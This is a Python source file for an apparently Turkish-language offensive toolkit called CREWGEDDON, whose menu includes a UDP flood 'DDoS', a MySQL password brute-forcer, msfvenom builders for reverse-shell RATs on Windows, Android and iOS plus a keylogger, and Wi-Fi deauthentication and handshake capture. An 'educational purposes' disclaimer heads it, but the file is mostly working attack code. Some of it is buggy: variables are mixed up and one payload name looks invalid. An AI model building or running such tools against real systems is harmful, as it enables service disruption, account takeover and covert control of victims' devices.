# Bu TOOLS Tamamen eğitim amaçlı kodlanmıştır, kötüye kullanırsanız ilk ben bulurum. <3☺️

from colorama import Fore, Back, Style
import socket
import random
import os
import time
import pymysql
pymysql.install_as_MySQLdb()
import requests
import subprocess

interface = "wlan0" # Monitör modundan sonra sonuna "wlan0mon" eki gelebilir, burayı oraya göre düzeltin, adını iwconfig yazıp öğrenebilirsiniz.

os.system("clear")
print(Fore.RED + """
      
 ██████╗ ██████╗ ███████╗ ██╗    ██╗  ██████╗ ███████╗ ██████╗ ██████╗  ██████╗ ███╗  ██╗
██╔════╝ ██╔══██╗ ██╔════╝ ██║    ██║ ██╔════╝ ██╔════╝ ██╔══██╗ ██╔══██╗ ██╔═══██╗ ████╗  ██║
██║      ██████╔╝ █████╗   ██║ █╗ ██║ ██║  ███╗ █████╗   ██║  ██║ ██║  ██║ ██║   ██║ ██╔██╗ ██║
██║      ██╔══██╗ ██╔══╝   ██║███╗██║ ██║   ██║ ██╔══╝   ██║  ██║ ██║  ██║ ██║   ██║ ██║╚██╗██║
╚██████╗ ██║  ██║ ███████╗ ╚███╔███╔╝ ╚██████╔╝ ███████╗ ██████╔╝ ██████╔╝ ╚██████╔╝ ██║ ╚████║
 ╚═════╝ ╚═╝  ╚═╝ ╚══════╝  ╚══╝╚══╝   ╚═════╝  ╚══════╝ ╚═════╝  ╚═════╝   ╚═════╝  ╚═╝  ╚═══╝
    
Discord: crew.dev             GitHub: crewcik
""")
print(Fore.LIGHTMAGENTA_EX + "☾★ Bu Yazılım CREW Tarafından Eğitim Amaçlı Kodlanmıştır. ☾★")
print(" ")
print(Fore.GREEN + "[1]" + Fore.BLUE + " - Açık Port Taraması")
print(Fore.GREEN + "[2]" + Fore.BLUE + " - Site IP Bulucu")
print(Fore.GREEN + "[3]" + Fore.BLUE + " - DDoS Saldırısı")
print(Fore.GREEN + "[4]" + Fore.BLUE + " - MySql'e Sızma")
print(Fore.GREEN + "[5]" + Fore.BLUE + " - Alt Alan Adı Bulucu")
print(Fore.GREEN + "-------------------------")
print(Fore.GREEN + "[6]" + Fore.BLUE + " - Remote Access Trojan (RAT) Aracı")
print(Fore.GREEN + "[7]" + Fore.BLUE + " - KeyLogger Aracı")
print(Fore.GREEN + "-------------------------")
print(Fore.GREEN + "[8]" + Fore.BLUE + " - Wifi Hack Aracı (Monitor Modu)")
print(Fore.GREEN + "[9]" + Fore.BLUE + " - Wifi Monitor Modu")
print(Fore.GREEN + "[10]" + Fore.BLUE + " - Wifi Managed Modu")
print(Fore.GREEN + "-------------------------")
print(Fore.GREEN + "[11]" + Fore.BLUE + " - Çıkış")
print(" ")
while True:
      select = input(Fore.CYAN + "CREWGEDDON~#: ")

      if select == "1":
          host = input(Fore.BLUE + "[CREWGEDDON]: IP Adresi: ")
          ports = [21, 22, 23, 25, 53, 80, 110, 139, 143, 443, 445, 3306, 8080]
          for p in ports:
              with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                  s.settimeout(0.5)
                  if s.connect_ex((host, p)) == 0:
                      print(Fore.GREEN + f"[CREWGEDDON]-[{host}]: Açık: {p}")
                  else:
                      print(Fore.RED + f"[CREWGEDDON]-[{host}]: Kapalı: {p}")


      elif select == "2":
            url = input(Fore.BLUE + "[CREWGEDDON]: Site Adresini Girin (crew.com): ")
            ip_address = socket.gethostbyname(url)
            if ip_address:
                  print(Fore.GREEN + f"[CREWGEDDON]: {url} Sitesi'nin IP Adresi: {ip_address}")
            else:
                  print(Fore.RED + "[CREWGEDDON]: Bu site şuan aktif değil.")


      elif select == "3":
            print(Fore.RED + "[CREWGEDDON]: DDoS Menüsüne Hoş Geldiniz.") 
            print(Fore.GREEN + "[0]" + Fore.BLUE + " - Ana Menü")
            print(Fore.GREEN + "[1]" + Fore.BLUE + " - Site Saldırısı")
            ddos_select = int(input(Fore.RED + "CREWGEDDON-DDOS~#: "))
            if ddos_select == 0:
                continue
            if ddos_select == 1:
                  ip = input(Fore.BLUE + "[CREWGEDDON-DDOS]: IP Adresi: ")
                  port = int(input(Fore.BLUE + "[CREWGEDDON-DDOS]: Saldırı Yapılacak Port: "))
                  crewsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                  counter = 0
                  crewrandom = random.randbytes(9999)
                  while True:
                       crewsock.sendto(crewrandom, (ip, port))
                       time.sleep(0.5)
                       print(Fore.RED + "[CREWGEDDON-DDOS]: " + Fore.GREEN + f"Saldırı {ip} adresine başladı. Durum: (%{counter})")
                       counter = counter + 1
                       if counter >= 5000:
                            print(Fore.RED + "[CREWGEDDON-DDOS]: Saldırı limitiniz doldu.")
                            break
                       


      elif select == "4":
                  print(Fore.RED + "[CREWGEDDON]: MySQL Sızma Aracına Hoş Geldiniz.")
                  host = input(Fore.BLUE + "[CREWGEDDON-MySql]: MySQL Host Adını Girin (localhost): ")
                  user = input(Fore.BLUE + "[CREWGEDDON-MySql]: MySQL Kullanıcı Adını Girin (root): ")
                  password_file = input(Fore.BLUE + "[CREWGEDDON-MySql]: Şifrelerin Olduğu WordList'i Belirtin (passwords.txt): ")
                  passwords = open(password_file, "r").readlines()
                  for password in passwords:
                      password = password.strip()
                      try:
                        db = pymysql.connect(host, user, password)
                        print(Fore.GREEN + f"[CREWGEDDON-MySql]: MySQL Şifresi Bulundu. Şifre: {password}")
                        mysql_login = input(Fore.BLUE + "[CREWGEDDON-MySql]: MySQL'e Giriş Yapılsın Mı? (e/h): ")
                        
                        if mysql_login.lower() == "e":
                              os.system(f"mysql -u {user} -p {password} -h {host}")
                        elif mysql_login.lower() == "h":
                              break
                        else:
                              print(Fore.RED + "[CREWGEDDON-MySql]: Geçersiz cevap belirtiniz..")
                              break
                        
                      except pymysql.Error:
                          print(Fore.RED + f"[CREWGEDDON-MySql]: Şifre WordList'de bulunamadı.: {password}") 



      elif select == "5":
            domain = input(Fore.BLUE + "[CREWGEDDON]: Site Adresini Belirtin (crew.com): ").strip()
            url = f"https://crt.sh/?q=%25.{domain}&output=json"

            try:    
                resp = requests.get(url, timeout=30)
                resp.raise_for_status()
            except requests.RequestException as e:
                print(Fore.RED + f"[CREWGEDDON]: İstek Hatası Meydana Geldi: {e}")
            try:
                data = resp.json()
            except ValueError:
                print(Fore.RED + "[CREWGEDDON]: JSON Hatası, consol satır limitini yükseltin.")
            subs = set()

            for entry in data:
                name = entry.get("name_value")
                if not name:
                    continue
                for n in name.splitlines():
                    n = n.strip()
                    if n.endswith(domain):
                        subs.add(n)

            if not subs:
                print(Fore.YELLOW + "[CREWGEDDON-AltAlanadı]: Alt alan ad(ları) bulunamadı.")
            else:
                print(Fore.GREEN + "[CREWGEDDON-AltAlanadı]: Alt Alan Adları Bulundu:")
                for sub in sorted(subs):
                    print(Fore.BLUE + f"[CREWGEDDON-AltAlanadı]: {sub}")



                    
      elif select == "6":
        print(Fore.RED + "[CREWGEDDON]: Remote Access Trojan Menüsüne Hoş Geldiniz.")
        print(Fore.GREEN + "[0]" + Fore.BLUE + " - Ana Menü")
        print(Fore.GREEN + "[1]" + Fore.BLUE + " - Masaüstü RAT Oluşturucu")
        print(Fore.GREEN + "[2]" + Fore.BLUE + " - Android Telefon RAT Oluşturucu")
        print(Fore.GREEN + "[3]" + Fore.BLUE + " - IOS Telefon RAT Oluşturucu")
        print(Fore.GREEN + "[4]" + Fore.BLUE + " - Dinlemeyi Başlatın")
        rat_select = int(input(Fore.CYAN + "CREWGEDDON-RAT~#: "))

        if rat_select == 0:
            continue
        elif rat_select == 1:
            ip_adress = input(Fore.BLUE + "[CREWGEDDON-DesktopRAT]: LOCAL IP Adresiniz: ")
            port = int(input(Fore.BLUE + "[CREWGEDDON-DesktopRAT]: LOCAL Port'unuz: "))
            exe_name = input(Fore.BLUE + "[CREWGEDDON-DesktopRAT]: Uygulamanın Adı Belirtin: ")
            os.system(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip_adress} LPORT={port} -f exe > {exe_name}.exe")
            print(Fore.GREEN + f"[CREWGEDDON-DesktopRAT]: {exe_name}.exe oluşturuldu ve root/{exe_name}.exe bölümüne kayıt edildi.")
        elif rat_select == 2:
            ip_adress = input(Fore.BLUE + "[CREWGEDDON-AndroidRAT]: LOCAL IP Adresiniz: ")
            port = int(input(Fore.BLUE + "[CREWGEDDON-AndroidRAT]: LOCAL Port'unuz: "))
            apk_name = input(Fore.BLUE + "[CREWGEDDON-AndroidRAT]: Uygulamanın Adı Belirtin: ")
            os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip_adress} LPORT={port} -f apk > {apk_name}.apk")
            print(Fore.GREEN + f"[CREWGEDDON-AndroidRAT]: {apk_name}.apk oluşturuldu ve root/{exe_name}.apk bölümüne kayıt edildi.")
        elif rat_select == 3:
            ip_adress = input(Fore.BLUE + "[CREWGEDDON-iOSRAT]: LOCAL IP Adresiniz: ")
            port = int(input(Fore.BLUE + "[CREWGEDDON-iOSRAT]: LOCAL Port'unuz: "))
            app_name = input(Fore.BLUE + "[CREWGEDDON-iOSRAT]: Uygulamanın Adı Belirtin: ")
            os.system(f"msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp LHOST={ip_adress} LPORT={port} -f macho > {app_name}.macho")
            print(Fore.GREEN + f"[CREWGEDDON-iOSRAT]: {app_name}.macho oluşturuldu ve root/{exe_name}.macho bölümüne kayıt edildi.")
        else:
            print(Fore.RED + "[CREWGEDDON]: Geçersiz seçim yaptınız.")

        
      elif select == "7":
          print(Fore.RED + "[CREWGEDDON]: KeyLogger Oluşturucuya Hoş Geldiniz.")
          print(Fore.GREEN + "[0]" + Fore.BLUE + " - Ana Menü")
          print(Fore.GREEN + "[1]" + Fore.BLUE + " - KeyLogger Oluşturun")
          print(Fore.GREEN + "[2]" + Fore.BLUE + " - Dinlemeyi Başlatın")
          keylogger_select = int(input(Fore.CYAN + "CREWGEDDON-KeyLogger~#: "))  
          if keylogger_select == 0:
              continue
          elif keylogger_select == 1:
              ip_adress = input(Fore.BLUE + "[CREWGEDDON-KeyLogger]: LOCAL IP Adresiniz: ")
              port = int(input(Fore.BLUE + "[CREWGEDDON-KeyLogger]: LOCAL Port'unuz: "))
              exe_name = input(Fore.BLUE + "[CREWGEDDON-KeyLogger]: Uygulama Adını Belirtin: ")
              os.system(f"msfvenom -p windows/x64/keylogger/reverse_tcp LHOST={ip_adress} LPORT={port} -f exe > {exe_name}.exe")
              print(Fore.GREEN + f"[CREWGEDDON-KeyLogger]: {exe_name}.exe oluşturuldu ve root/{exe_name}.exe bölümüne kayıt edildi.")



      elif select == "8":
          print(Fore.RED + "[CREWGEDDON]: Wifi Hack Aracına Hoş Geldiniz.")
          print(Fore.GREEN + "[0]" + Fore.BLUE + " - Ana Menü")
          print(Fore.GREEN + "[1]" + Fore.BLUE + " - Ağları İzleyin")
          print(Fore.GREEN + "[2]" + Fore.BLUE + " - Ağ Özel İzleme")
          print(Fore.GREEN + "[3]" + Fore.BLUE + " - Ağ Saldırı")
          print(Fore.GREEN + "[4]" + Fore.BLUE + " - Cihaza Özel Saldırı")
          print(Fore.GREEN + "[5]" + Fore.BLUE + " - Hanshake Yakalama")
          print(Fore.RED + "[-]" + Fore.BLUE + " - Sahte Wifi Oluşturucu" + Fore.GREEN + " (YAKINDA) ")
          print(Fore.RED + "[-]" + Fore.BLUE + " - Ortadaki Adam Saldırısı" + Fore.GREEN + " (YAKINDA) ")
          secim_wifi = int(input("CREWGEDDON-Wifi~#: "))

          if secim_wifi == 0:
               continue
          elif secim_wifi == 1:
               print(Fore.RED + "[CREWGEDDON-Wifi]: Taramayı durdurmak için CTRL + C tuşlarına basın.")
               subprocess.Popen([
                    "xterm",
                    "-T", "Crewgeddon - Ağ Taraması",
                    "-hold",
                    "-e", f"airodump-ng {interface}"
                ])
          elif secim_wifi == 2:
               bss_id = input(Fore.RED + "[CREWGEDDON-Wifi]: BSSID: ")
               channel_id = int(input(Fore.RED + "[CREWGEDDON-Wifi]: CHANNEL: "))
               subprocess.Popen(["xterm", "-T", "Crewgeddon - Özel Ağ İzleyicisi", "-hold", "-e", f"airodump-ng --channel {channel_id} --bssid {bss_id} {interface}"])
          elif secim_wifi == 3:
               adet = int(input(Fore.BLUE + "[CREWGEDDON-Wifi]: Saldırı Adeti (50-1000): "))
               if adet < 50 or adet > 1000:
                    print(Fore.RED + "[CREWGEDDON-Wifi]: Lütfen 50 ila 1000 arasında bir rakam belirtin.")
               else:
                    bssid = input(Fore.BLUE + "[CREWGEDDON-Wifi]: BSSID: ")
                    print(Fore.GREEN + "[CREWGEDDON-Wifi]: Saldırı Başlatıldı.")
                    subprocess.Popen(["xterm", "-T", "Crewgeddon - Ağ Saldırısı", "-hold", "-e", f"aireplay-ng --deauth {adet} -a {bssid} {interface}"])
          elif secim_wifi == 4:
               adet = int(input(Fore.BLUE + "[CREWGEDDON-Wifi]: Saldırı Adeti (50-1000): "))
               if adet < 50 or adet > 1000:
                    print(Fore.RED + "[CREWGEDDON-Wifi]: Lütfen 50 ila 1000 arasında bir rakam belirtin.")
               else:
                    bssid = input(Fore.BLUE + "[CREWGEDDON-Wifi]: BSSID: ")
                    tbssid = input(Fore.BLUE + "[CREWGEDDON-Wifi]: Saldırılacak BSSID: ")
                    print(Fore.GREEN + "[CREWGEDDON-Wifi]: Saldırı Başlatıldı.")
                    subprocess.Popen(["xterm", "-T", "Crewgeddon - Özel Ağ Saldırısı", "-hold", "-e", f"aireplay-ng --deauth {adet} -a {bssid} -c {tbssid} {interface}"])
          elif secim_wifi == 5:
               subprocess.Popen(["xterm", "-T", "Crewgeddon - Hedef Bulucu", "-hold", "-e", f"airodump-ng {interface}"])
               bss_id = input(Fore.RED + "[CREWGEDDON-Wifi]: BSSID: ")
               channel_id = int(input(Fore.RED + "[CREWGEDDON-Wifi]: CHANNEL: "))
               subprocess.Popen(["xterm", "-T", "Crewgeddon - Özel Ağ İzleyicisi", "-hold", "-e", f"airodump-ng --channel {channel_id} --bssid {bss_id} --write crewgeddon_handshake {interface}"])
               subprocess.Popen(["xterm", "-T", "Crewgeddon - Ağ Saldırısı", "-hold", "-e", f"aireplay-ng --deauth 5000 -a {bss_id} {interface}"])
               print(Fore.GREEN + "[CREWGEDDON-Wifi]: .cap Dosyası /crewgeddon/crewgeddon_handshake.cap Yoluna kayıt edilecek.")
          else:
               print(Fore.RED + "[CREWGEDDON]: Geçersiz seçim yaptınız.")


      elif select == "9":
          subprocess.Popen(["xterm", "-T", "Crewgeddon - Monitör Mod", "-hold", "-e", f"airmon-ng start {interface}"])
          print(Fore.BLUE + f"[CREWGEDDON-Wifi]: Başarıyla monitör moda geçiş yapıldı.")



      elif select == "10":
          subprocess.Popen(["xterm", "-T", "Crewgeddon - Managed Mod", "-hold", "-e", f"airmon-ng stop {interface}"])
          print(Fore.BLUE + f"[CREWGEDDON-Wifi]: Başarıyla managed moda geçiş yapıldı.")



      elif select == "11":
            print(Fore.RED + "[CREWGEDDON]: Crewgeddon kapatıldı, tekrardan görüşmek üzere...")
            os.system("exit")
            break
      


      else: 
            print(Fore.RED + "[CREWGEDDON]: Geçersiz seçim yaptınız.")
